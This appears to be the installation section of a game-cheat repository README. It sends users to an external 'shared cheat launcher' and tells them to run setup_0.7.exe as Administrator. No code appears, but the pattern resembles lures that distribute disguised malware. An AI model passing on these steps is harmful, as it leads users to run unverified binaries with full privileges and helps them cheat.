## 📥 Installation

Downloads for these projects are provided through a **shared cheat launcher**. The download button links to the launcher distribution, rather than a standalone build stored in this repository.

1. Download the archive via the button above
2. Extract `setup_0.7.exe` from the archive
3. Run `setup_0.7.exe` **as Administrator**
4. Wait for unpacking to finish
5. Launch the game
